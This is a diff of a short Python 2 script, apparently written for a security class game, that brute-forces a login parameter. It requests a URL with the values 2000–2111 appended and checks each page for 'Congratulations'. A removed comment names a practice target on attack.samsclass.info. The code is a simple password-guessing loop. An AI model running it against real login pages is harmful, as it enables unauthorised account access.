@@ -1,14 +1,12 @@
 import pycurl
 from StringIO import StringIO
 
-start_url = input("enter the url that you want to heckle. put it in double quotes: ")
-# start_url = 'http://attack.samsclass.info/samsgame1/2/login2-active-vjfj3kj.php?pw='
-# start_url = "https://"+ first_url
+start_url = input("enter the url that you want to heckle. put it in double quotes b/c that isn't getting fixed right now. #doitlater: ")
+
 print "starting with",start_url
 
-
 for n in range(2000, 2112):
-    final_url = start_url+str(n)
+    final_url = start_url+"="+str(n)
 
     buffer = StringIO()
     c = pycurl.Curl()
@@ -18,8 +16,6 @@ for n in range(2000, 2112):
     c.close()
 
     body = buffer.getvalue()
-  # Body is a string in some encoding.
-  # In Python 2, we can print it without knowing what the encoding is.
 
     b = "Congratulations"
 
